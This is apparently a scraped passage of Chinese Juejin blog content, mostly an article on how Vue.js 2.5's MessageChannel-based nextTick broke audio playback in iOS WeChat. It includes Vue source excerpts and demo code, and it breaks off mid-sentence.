class=\"hljs-string\">\"./index.html\"</span>);\n//引入sass\nrequire(<span class=\"hljs-string\">\"./src/sass/com.scss\"</span>);\nimport Vue from <span class=\"hljs-string\">'vue'</span>\nimport dialog from <span class=\"hljs-string\">'./src/js/components/index'</span>;\n//使用弹窗插件\nVue.use(dialog)\n<span class=\"hljs-built_in\">let</span> App = new Vue({\n    el: <span class=\"hljs-string\">'#app'</span>,\n    <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>(){\n        <span class=\"hljs-built_in\">return</span> {\n            <span class=\"hljs-string\">'name'</span>: <span class=\"hljs-string\">'index'</span>\n        }\n    },\n    <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span>(){\n        //触发confirm弹窗\n        this.<span class=\"hljs-variable\">$confirm</span>({\n            title:<span class=\"hljs-string\">'提示'</span>,\n            content:<span class=\"hljs-string\">'这里是提示内容'</span>,\n            submitText:<span class=\"hljs-string\">'提交'</span>,\n            cancelText:<span class=\"hljs-string\">'返回'</span>\n        }).then(()=&gt;{\n            //触发alert弹窗\n            this.<span class=\"hljs-variable\">$alert</span>({\n                title:<span class=\"hljs-string\">'提示2'</span>,\n                content:<span class=\"hljs-string\">'这里是提示内容2'</span>\n            }).then(()=&gt;{\n                this.name=<span class=\"hljs-string\">'守候'</span>\n                alert(this.name)\n            })\n        }).catch((err)=&gt;{\n            alert(err)\n        })\n    }\n}); \n</code></pre><p>运行结果，就是这样</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a7d30809d?imageslim\" data-width=\"800\" data-height=\"628\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;628&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-7\">5.小结</h2><p>一个简单的弹窗就到这里了，很简单，但是在我开发那里还是能用，能暂时满足。但是这个肯定是需要维护的，毕竟很多的项目都需要弹窗。大家也根据自己的需要进行拓展！以上的案例也很简单，容易懂。基本都是记流程。但是这个我很建议大家边动手，边看文章。这个可以让自己练习下基于vue开发插件，是一个不错的练习，希望能帮到大家学习到新的知识！最后，如果觉得文章那里写的不好或者写错了，欢迎指出！</p><p><br></p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div>"},{"title":" Vue.js 升级踩坑小记","avatar":"https://user-gold-cdn.xitu.io/2017/9/25/8c2308ac1d83bf3344016184b44d901c?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"黄轶","create_time":"2017 年 11 月 27 日","tags":["Vue.js","JavaScript","前端框架"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>本文并不是什么高深的技术文章，只是记录我最近遇到一个因为 Vue 升级导致我的一个项目踩坑以及我解决问题的过程。文章虽长但不水，写下来的目的是想和大家分享一下我遇到问题时候一个思考的方法和态度。</p>\n<blockquote>\n<p>背景：去年我在慕课网推出了一门 Vue.js 的入门实战课程——<a href=\"https://link.juejin.im?target=http%3A%2F%2Fcoding.imooc.com%2Fclass%2F74.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vue.js 高仿饿了么外卖 App</a> ，这门课程收到了非常不错的反响，于是今年又在慕课网上继续推出了 Vue.js 的高级进阶实战课程——<a href=\"https://link.juejin.im?target=http%3A%2F%2Fcoding.imooc.com%2Fclass%2F107.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vue.js 音乐 App</a>，同样反馈不错。每天晚上下班回家，我会去问答区看一下学生们的问题，发现近期有不少同学反馈了同样的问题，iOS 微信里点击不能播放歌曲了，PC 可以。通常遇到这种问题我会让学生先去访问我的项目的<a href=\"https://link.juejin.im?target=http%3A%2F%2Fustbhuangyi.com%2Fmusic%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">线上地址</a>，看看我的代码会不会有问题，得到的结论是我的线上代码没问题，但他们自己写就不行，并且说已经完全和我的代码做了对比，这就让我觉得十分诡异。没过多久，有些学生就想出了一个办法，在全局 document 绑定一个同步的 click 事件，在 click 事件的回调函数中同步触发一次 audio 的 play 方法，似乎解决了问题，也得到了一些同学的采纳，但是我看到以后的第一反应是不能用这种太 hack 的方式去解决问题，必须找到问题的本质，于是乎我开始了一段很有意思的找问题的过程。</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-0\">定位问题</h2><p>先看现象：同学们写的代码在 iOS 微信浏览器下不能播放，PC 是可以的；我线上的代码是都可以。了解现象后我开始排查问题：</p>\n<ul>\n<li><p>同学们的代码写的有问题？<br>虽然会有这种可能性，但从 2 个维度被我否决了：1. 同学们也都对比过我的源码的，而且出问题的同学也不是个别现象；2. 如果是代码问题，那么大多可能性是 PC 和移动端都不能播放。</p>\n</li>\n<li><p>找不同？<br>这个问题是最新才出现的，同学们开始学习编写课程代码都也是通过 vue-cli 脚手架先初始化代码。接着我大概看了一下新版的脚手架初始化的代码，果然是大不同，webpack 升级到 3+，配置发生了很大的变化。不过依据我的经验，构建工具的升级是不会影响业务代码的，一定还有别的原因。</p>\n</li>\n<li><p>Vue.js 升级？<br>除了 webpack 配置的不同，最新脚手架初始化的代码用的 Vue.js 版本是 2.5+，而我线上代码的 Vue.js 版本是 2.3+，难道是 Vue.js 导致的问题吗？带着这个疑问我去翻阅了 Vue.js 的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Freleases\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">release log</a>，发现 Vue.js 大大小小版本发布了十几次。如果每个都仔细查看也会很耗时，于是我采用了一个经典的 2 分法的思路去定位，我先把 Vue.js 升级到 2.4.0，发现竟然安装不了（这是 Vue.js 刚升到 2.4 npm 发布的 bug），于是又升级到 2.4.1，然后拿我的手机试了一下，还是可以播放的。接着我把 Vue.js 升级到 2.5.0，手机一试果然不能播放了，（擦。。）我心里默念一句，总算找到问题所在了。</p>\n</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-1\">问题的本质</h2><p>以上定位到问题大概花了我半小时时间，但是我并没有找到问题的根本原因，于是我翻阅了 Vue.js 2.5 的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Freleases%2Ftag%2Fv2.5.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">release log</a>，由于很长就不列了。Vue.js 每次升级主要分成 2 大类，Features &amp; Improvements 和 Bug Fixes。我从上往下依次扫了一遍，把一些关于它核心的改动都点进去看了一下代码的修改，最终锁定了这一条：</p>\n<blockquote>\n<p>use MessageChannel for nextTick 6e41679, closes #6566 #6690</p>\n</blockquote>\n<p>接着我点进去看了一下<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fcommit%2F6e41679a96582da3e0a60bdbf123c33ba0e86b31\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">改动</a>，我滴天，改动很大呀，nextTick 的核心实现变了，MutationObserver 不见了，改成了 MessageChannel 的实现。等等，有些同学看到这里，可能会懵，这都是些啥呀。不急，我先简单解释一下 Vue 的 nextTick。</p>\n<h3 class=\"heading\" data-id=\"heading-2\">nextTick</h3><p>介绍 Vue 的 nextTick 之前，我先简单介绍一下 JS 的运行机制：JS 执行是单线程的，它是基于事件循环的。对于事件循环的理解，阮老师有<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2014%2F10%2Fevent-loop.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">一篇文章</a>写的很清楚，大致分为以下几个步骤：</p>\n<p>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。</p>\n<p>（2）主线程之外，还存在一个\"任务队列\"（task queue）。只要异步任务有了运行结果，就在\"任务队列\"之中放置一个事件。</p>\n<p>（3）一旦\"执行栈\"中的所有同步任务执行完毕，系统就会读取\"任务队列\"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</p>\n<p>（4）主线程不断重复上面的第三步。</p>\n<p>主线程的执行过程就是一个 tick，而所有的异步结果都是通过 “任务队列” 来调度被调度。 消息队列中存放的是一个个的任务（task）。 规范中规定 task 分为两大类，分别是 macro task 和 micro task，并且每个 macro task 结束后，都要清空所有的 micro task。</p>\n<p>关于 macro task 和 micro task 的概念，这里不会细讲，简单通过一段代码演示他们的执行顺序：</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-keyword\">for</span> (macroTask <span class=\"hljs-keyword\">of</span> macroTaskQueue) {\n    <span class=\"hljs-comment\">// 1. Handle current MACRO-TASK</span>\n    handleMacroTask();\n\n    <span class=\"hljs-comment\">// 2. Handle all MICRO-TASK</span>\n    <span class=\"hljs-keyword\">for</span> (microTask <span class=\"hljs-keyword\">of</span> microTaskQueue) {\n        handleMicroTask(microTask);\n    }\n}</code></pre><p>在浏览器环境中，常见的 macro task 有 setTimeout、MessageChannel、postMessage、setImmediate；常见的 micro task 有 MutationObsever 和 Promise.then。对于它们更多的了解，感兴趣的同学可以看<a href=\"https://link.juejin.im?target=https%3A%2F%2Fjakearchibald.com%2F2015%2Ftasks-microtasks-queues-and-schedules%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">这篇文章</a>。</p>\n<p>回到 Vue 的 nextTick，nextTick 顾名思义，就是下一个 tick，Vue 内部实现了 nextTick，并把它作为一个全局 API 暴露出来，它支持传入一个回调函数，保证回调函数的执行时机是在下一个 tick。官网文档介绍了 Vue.nextTick 的使用场景：</p>\n<blockquote>\n<p>Usage: Defer the callback to be executed after the next DOM update cycle. Use it immediately after you’ve changed some data to wait for the DOM update.<br>使用：在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后立即使用这个方法，获取更新后的 DOM。</p>\n</blockquote>\n<p>在 Vue.js 里是数据驱动视图变化，由于 JS 执行是单线程的，在一个 tick 的过程中，它可能会多次修改数据，但 Vue.js 并不会傻到每修改一次数据就去驱动一次视图变化，它会把这些数据的修改全部 push 到一个队列里，然后内部调用 一次 nextTick 去更新视图，所以数据到 DOM 视图的变化是需要在下一个 tick 才能完成。</p>\n<p>接下来，我们来看一下 Vue 的 nextTick 的实现，在 Vue.js 2.5+ 的版本，抽出来一个单独的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fblob%2Fdev%2Fsrc%2Fcore%2Futil%2Fnext-tick.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">next-tick.js</a> 文件去实现它。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">/* @flow */</span>\n<span class=\"hljs-comment\">/* globals MessageChannel */</span>\n\n<span class=\"hljs-keyword\">import</span> { noop } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'shared/util'</span>\n<span class=\"hljs-keyword\">import</span> { handleError } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./error'</span>\n<span class=\"hljs-keyword\">import</span> { isIOS, isNative } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./env'</span>\n\n<span class=\"hljs-keyword\">const</span> callbacks = []\n<span class=\"hljs-keyword\">let</span> pending = <span class=\"hljs-literal\">false</span>\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">flushCallbacks</span> (<span class=\"hljs-params\"></span>) </span>{\n  pending = <span class=\"hljs-literal\">false</span>\n  <span class=\"hljs-keyword\">const</span> copies = callbacks.slice(<span class=\"hljs-number\">0</span>)\n  callbacks.length = <span class=\"hljs-number\">0</span>\n  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; copies.length; i++) {\n    copies[i]()\n  }\n}\n\n<span class=\"hljs-comment\">// Here we have async deferring wrappers using both micro and macro tasks.</span>\n<span class=\"hljs-comment\">// In &lt; 2.4 we used micro tasks everywhere, but there are some scenarios where</span>\n<span class=\"hljs-comment\">// micro tasks have too high a priority and fires in between supposedly</span>\n<span class=\"hljs-comment\">// sequential events (e.g. #4521, #6690) or even between bubbling of the same</span>\n<span class=\"hljs-comment\">// event (#6566). However, using macro tasks everywhere also has subtle problems</span>\n<span class=\"hljs-comment\">// when state is changed right before repaint (e.g. #6813, out-in transitions).</span>\n<span class=\"hljs-comment\">// Here we use micro task by default, but expose a way to force macro task when</span>\n<span class=\"hljs-comment\">// needed (e.g. in event handlers attached by v-on).</span>\n<span class=\"hljs-keyword\">let</span> microTimerFunc\n<span class=\"hljs-keyword\">let</span> macroTimerFunc\n<span class=\"hljs-keyword\">let</span> useMacroTask = <span class=\"hljs-literal\">false</span>\n\n<span class=\"hljs-comment\">// Determine (macro) Task defer implementation.</span>\n<span class=\"hljs-comment\">// Technically setImmediate should be the ideal choice, but it's only available</span>\n<span class=\"hljs-comment\">// in IE. The only polyfill that consistently queues the callback after all DOM</span>\n<span class=\"hljs-comment\">// events triggered in the same loop is by using MessageChannel.</span>\n<span class=\"hljs-comment\">/* istanbul ignore if */</span>\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> setImmediate !== <span class=\"hljs-string\">'undefined'</span> &amp;&amp; isNative(setImmediate)) {\n  macroTimerFunc = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    setImmediate(flushCallbacks)\n  }\n} <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> MessageChannel !== <span class=\"hljs-string\">'undefined'</span> &amp;&amp; (\n  isNative(MessageChannel) ||\n  <span class=\"hljs-comment\">// PhantomJS</span>\n  MessageChannel.toString() === <span class=\"hljs-string\">'[object MessageChannelConstructor]'</span>\n)) {\n  <span class=\"hljs-keyword\">const</span> channel = <span class=\"hljs-keyword\">new</span> MessageChannel()\n  <span class=\"hljs-keyword\">const</span> port = channel.port2\n  channel.port1.onmessage = flushCallbacks\n  macroTimerFunc = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    port.postMessage(<span class=\"hljs-number\">1</span>)\n  }\n} <span class=\"hljs-keyword\">else</span> {\n  <span class=\"hljs-comment\">/* istanbul ignore next */</span>\n  macroTimerFunc = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    setTimeout(flushCallbacks, <span class=\"hljs-number\">0</span>)\n  }\n}\n\n<span class=\"hljs-comment\">// Determine MicroTask defer implementation.</span>\n<span class=\"hljs-comment\">/* istanbul ignore next, $flow-disable-line */</span>\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-built_in\">Promise</span> !== <span class=\"hljs-string\">'undefined'</span> &amp;&amp; isNative(<span class=\"hljs-built_in\">Promise</span>)) {\n  <span class=\"hljs-keyword\">const</span> p = <span class=\"hljs-built_in\">Promise</span>.resolve()\n  microTimerFunc = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    p.then(flushCallbacks)\n    <span class=\"hljs-comment\">// in problematic UIWebViews, Promise.then doesn't completely break, but</span>\n    <span class=\"hljs-comment\">// it can get stuck in a weird state where callbacks are pushed into the</span>\n    <span class=\"hljs-comment\">// microtask queue but the queue isn't being flushed, until the browser</span>\n    <span class=\"hljs-comment\">// needs to do some other work, e.g. handle a timer. Therefore we can</span>\n    <span class=\"hljs-comment\">// \"force\" the microtask queue to be flushed by adding an empty timer.</span>\n    <span class=\"hljs-keyword\">if</span> (isIOS) setTimeout(noop)\n  }\n} <span class=\"hljs-keyword\">else</span> {\n  <span class=\"hljs-comment\">// fallback to macro</span>\n  microTimerFunc = macroTimerFunc\n}\n\n<span class=\"hljs-comment\">/**\n * Wrap a function so that if any code inside triggers state change,\n * the changes are queued using a Task instead of a MicroTask.\n */</span>\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withMacroTask</span> (<span class=\"hljs-params\">fn: Function</span>): <span class=\"hljs-title\">Function</span> </span>{\n  <span class=\"hljs-keyword\">return</span> fn._withTask || (fn._withTask = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n    useMacroTask = <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-keyword\">const</span> res = fn.apply(<span class=\"hljs-literal\">null</span>, <span class=\"hljs-built_in\">arguments</span>)\n    useMacroTask = <span class=\"hljs-literal\">false</span>\n    <span class=\"hljs-keyword\">return</span> res\n  })\n}\n\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">nextTick</span> (<span class=\"hljs-params\">cb?: Function, ctx?: Object</span>) </span>{\n  <span class=\"hljs-keyword\">let</span> _resolve\n  callbacks.push(<span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    <span class=\"hljs-keyword\">if</span> (cb) {\n      <span class=\"hljs-keyword\">try</span> {\n        cb.call(ctx)\n      } <span class=\"hljs-keyword\">catch</span> (e) {\n        handleError(e, ctx, <span class=\"hljs-string\">'nextTick'</span>)\n      }\n    } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (_resolve) {\n      _resolve(ctx)\n    }\n  })\n  <span class=\"hljs-keyword\">if</span> (!pending) {\n    pending = <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-keyword\">if</span> (useMacroTask) {\n      macroTimerFunc()\n    } <span class=\"hljs-keyword\">else</span> {\n      microTimerFunc()\n    }\n  }\n  <span class=\"hljs-comment\">// $flow-disable-line</span>\n  <span class=\"hljs-keyword\">if</span> (!cb &amp;&amp; <span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-built_in\">Promise</span> !== <span class=\"hljs-string\">'undefined'</span>) {\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">resolve</span> =&gt;</span> {\n      _resolve = resolve\n    })\n  }\n}</code></pre><p>我们在有之前的知识背景，再理解 nextTick 的实现就不难了，这里有一段很关键的注释：在 Vue 2.4 之前的版本，nextTick 几乎都是基于 micro task 实现的，但由于  micro task 的执行优先级非常高，在某些场景下它甚至要比事件冒泡还要快，就会导致一些诡异的问题，如 issue <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F4521\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#4521</a>、<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F6690\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#6690</a>、<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F6566\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#6566</a>；但是如果全部都改成 macro task，对一些有重绘和动画的场景也会有性能影响，如 issue <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F6813\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#6813</a>。所以最终 nextTick 采取的策略是默认走 micro task，对于一些 DOM 交互事件，如 v-on 绑定的事件回调函数的处理，会强制走 macro task。</p>\n<p>这个强制是怎么做的呢，原来在 Vue.js 在绑定 DOM 事件的时候，默认会给回调的 <code>handler</code> 函数调用 <code>withMacroTask</code> 方法做一层包装，它保证整个回调函数执行过程中，遇到数据状态的改变，这些改变都会被推到 macro task 中。</p>\n<p>对于 macro task 的执行，Vue.js 优先检测是否支持原生 <code>setImmediate</code>，这是一个高版本 IE 和 Edge 才支持的特性，不支持的话再去检测是否支持原生的 <code>MessageChannel</code>，如果也不支持的话就会降级为 <code>setTimeout 0</code>。</p>\n<h2 class=\"heading\" data-id=\"heading-3\">nextTick 对 audio 播放的影响</h2><p>回到我们的问题，iOS 微信浏览器不能播放歌曲和 nextTick 有什么关系呢？先来看一下我们的歌曲播放这个功能的实现方法。</p>\n<p>我们的代码会有一个播放器组件 player.vue，在这个组件中我们会持有一个 html5 的 audio 标签。由于可调用播放的地方很多，比如在歌曲列表组件、榜单组件、搜索结果组件等等，因此我们用 vuex 对播放相关的数据进行管理。我们把正在播放的列表 <code>playlist</code> 和当前播放索引 <code>currentIndex</code> 用 state 维护，当前播放的歌曲 <code>currentSong</code> 通过它们计算而来：</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">// state.js</span>\n<span class=\"hljs-keyword\">const</span> state = {\n  <span class=\"hljs-attr\">playlist</span>: [],\n  <span class=\"hljs-attr\">currentIndex</span>:<span class=\"hljs-number\">0</span>\n}\n<span class=\"hljs-comment\">// getters.js</span>\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> currentSong = <span class=\"hljs-function\">(<span class=\"hljs-params\">state</span>) =&gt;</span> {\n  <span class=\"hljs-keyword\">return</span> state.playlist[state.currentIndex] || {}\n}</code></pre><p>然后我们在 player.vue 组件里 watch <code>currentSong</code> 的变化去播放歌曲：</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">// player.vue</span>\nwatch : {\n   currentSong(newSong,oldSong) {\n      <span class=\"hljs-keyword\">if</span> (!newSong.id || !newSong.url || newSong.id === oldSong.id) {\n          <span class=\"hljs-keyword\">return</span>\n       }\n       <span class=\"hljs-keyword\">this</span>.$refs.audio.src = newSong.url\n       <span class=\"hljs-keyword\">this</span>.$refs.audio.play()\n   }\n}</code></pre><p>这样我们就可以在任何组件中提交对 <code>playlist</code> 和 <code>currentIndex</code> 的修改来达到播放不同歌曲的目的。那么这么写和 nextTick 有什么关系呢？</p>\n<p>因为在 Vue.js 中，watcher 的回调函数执行默认是异步的，当我们提交对 <code>playlist</code> 或者 <code>currenIndex</code> 的修改，都会触发 <code>currentSong</code> 的变化，但是由于是异步，并不会立刻执行 watcher 的回调函数，而会在 nextTick 后执行。所以当我们点击歌曲列表中的歌曲后，在 click 的事件回调函数中会提交对 <code>playlist</code> 和 <code>currentIndex</code> 的修改， 经过一系列同步的逻辑执行，最终是在 nextTick 后才会执行 wathcer 的回调，也就是调用 audio 的 play。</p>\n<p>所以本质上，就是用户点击到 audio 的 play 并不是在一个 tick 中完成，并且前面提到 Vue.js 中对 v-on 绑定事件执行的 nextTick 过程会强制使用 macro task。那么到底是不是由于 nextTick 影响了 audio 在 iOS 微信浏览器中的播放呢，<br>我们就来把化繁为简，写一个简单 demo 来验证这个问题，用的 Vue.js 版本是 2.5+ 的。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;\n    &lt;div id=<span class=\"hljs-string\">\"app\"</span>&gt;\n        &lt;audio ref=<span class=\"hljs-string\">\"audio\"</span>&gt;&lt;/audio&gt;\n        &lt;button @click=<span class=\"hljs-string\">\"changeUrl\"</span>&gt;click me&lt;/button&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n    const musicList = [\n    <span class=\"hljs-string\">'http://ws.stream.qqmusic.qq.com/108756223.m4a?fromtag=46'</span>,\n    <span class=\"hljs-string\">'http://ws.stream.qqmusic.qq.com/101787871.m4a?fromtag=46'</span>,\n    <span class=\"hljs-string\">'http://ws.stream.qqmusic.qq.com/718475.m4a?fromtag=46'</span>\n  ]\n\n  <span class=\"hljs-built_in\">export</span> default {\n    name: <span class=\"hljs-string\">'app'</span>,\n    <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>() {\n      <span class=\"hljs-built_in\">return</span> {\n        index: 0,\n        url: <span class=\"hljs-string\">''</span>\n      }\n    },\n    methods: {\n      <span class=\"hljs-function\"><span class=\"hljs-title\">changeUrl</span></span>() {\n        this.index = (this.index + 1) % musicList.length\n        this.url = musicList[this.index]\n      }\n    },\n    watch: {\n      url(newUrl) {\n        this.<span class=\"hljs-variable\">$refs</span>.audio.src = newUrl\n        this.<span class=\"hljs-variable\">$refs</span>.audio.play()\n      }\n    }\n  }\n&lt;/script&gt;</code></pre><p>这段代码的逻辑非常简单，我们会添加一个 watcher 监听 <code>url</code> 变化，当点击按钮的时候，会调用 <code>changeUrl</code> 方法，修改 <code>url</code>，然后 watcher 的回调函数执行，并调用 audio 的 play 方法。这段代码在 PC 浏览器是可以正常播放歌曲的，但是在 iOS 微信浏览器里却不能播放，这就证实了我们之前的猜想——在用户点击事件的回调函数到 audio 的播放如果经历了 nextTick 在 iOS 微信浏览器下不能播放。</p>\n<h2 class=\"heading\" data-id=\"heading-4\">macro task 的锅？</h2><p>有些同学可能会认为，当用户点击了按钮到播放的过程在 iOS 微信浏览器或者是 iOS safari 浏览器应该需要在同一个 tick 才能执行，果真需要这样吗？我们把上述代码做一个简单的修改：</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">changeUrl() {\n  <span class=\"hljs-keyword\">this</span>.index = (<span class=\"hljs-keyword\">this</span>.index + <span class=\"hljs-number\">1</span>) % musicList.length\n  <span class=\"hljs-keyword\">this</span>.url = musicList[<span class=\"hljs-keyword\">this</span>.index]\n\n  setTimeout(<span class=\"hljs-function\"><span class=\"hljs-params\">()</span>=&gt;</span>{\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.src = <span class=\"hljs-keyword\">this</span>.url\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.play()\n  }, <span class=\"hljs-number\">0</span>)\n}</code></pre><p>我们现在不利用 Vue.js 的 nextTick 了，直接来模拟 nextTick 的过程，发现使用 <code>setTimeout 0</code> 是可以在 iOS 微信浏览器器、包括 iOS safari 下播放的，然而实际上我们只要在 1000ms 内的延时时间播放都是可以的，但是超过 1000ms，比如 <code>setTimeout 1001</code> 又不能播放了，感兴趣的同学可以试试，这个现象的理论依据我还没找到，如果知道理论的同学也非常欢迎留言告诉我。</p>\n<p>所以通过上述的实验，我们发现并不一定要在同一个 tick 执行播放，那么为啥 Vue.js 的 nextTick 是不可以的呢？回到 nextTick 的 macro task 的实现，它优先 <code>setImmediate</code>、然后 <code>MessageChannel</code>，最后才是 <code>setTimeout 0</code>。我们知道，除了高版本 IE 和 Edge，<code>setImmediate</code> 是没有原生支持的，除非一些工具对它进行了重新改写。而 <code>MessageChannel</code> 的浏览器支持程度还是非常高的，那么我把这段 demo 的异步过程改成用 <code>MessageChannel</code> 实现。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">changeUrl() {\n  <span class=\"hljs-keyword\">this</span>.index = (<span class=\"hljs-keyword\">this</span>.index + <span class=\"hljs-number\">1</span>) % musicList.length\n  <span class=\"hljs-keyword\">this</span>.url = musicList[<span class=\"hljs-keyword\">this</span>.index]\n\n  <span class=\"hljs-keyword\">let</span> channel = <span class=\"hljs-keyword\">new</span> MessageChannel()\n  <span class=\"hljs-keyword\">let</span> port = channel.port2\n  channel.port1.onmessage = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.src = <span class=\"hljs-keyword\">this</span>.url\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.play()\n  }\n  port.postMessage(<span class=\"hljs-number\">1</span>)\n}</code></pre><p>这段代码在 PC 浏览器是可以播放的，而在 iOS 微信浏览器又不能播放了，调试后发现 <code>this.$refs.audio.play()</code> 的逻辑也是可以执行到的，但是歌曲并不能播放，应该是浏览器对 audio 播放在使用 MessageChannel 做异步的一种限制。</p>\n<p>前面提到实现 macro task 还有一种方法是利用 postMessage，它的浏览器支持程度也很好，我们来把 demo 改成利用它来实现。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">changeUrl() {\n  <span class=\"hljs-keyword\">this</span>.index = (<span class=\"hljs-keyword\">this</span>.index + <span class=\"hljs-number\">1</span>) % musicList.length\n  <span class=\"hljs-keyword\">this</span>.url = musicList[<span class=\"hljs-keyword\">this</span>.index]\n\n  addEventListener(<span class=\"hljs-string\">'message'</span>, () =&gt; {\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.src = <span class=\"hljs-keyword\">this</span>.url\n    <span class=\"hljs-keyword\">this</span>.$refs.audio.play()\n  }, <span class=\"hljs-literal\">false</span>);\n  postMessage(<span class=\"hljs-number\">1</span>, <span class=\"hljs-string\">'*'</span>)\n}</code></pre><p>这段代码在 PC 浏览器和 iOS 微信浏览器以及 iOS safari 都可以播放的，说明并不是 macro task 的锅，而是 MessageChannel 的锅。其实 macro task 还有很多实现方式，感兴趣的同学可以看看 core-js 中对于 macro task 的几种<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fmodules%2F_task.js%23L28-L80\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">实现方式</a>。</p>\n<h2 class=\"heading\" data-id=\"heading-5\">如何解决？</h2><p>现在我们定位到问题的本质是因为 Vue.js 的 nextTick 中优先使用了 MessageChannel，它会影响 iOS 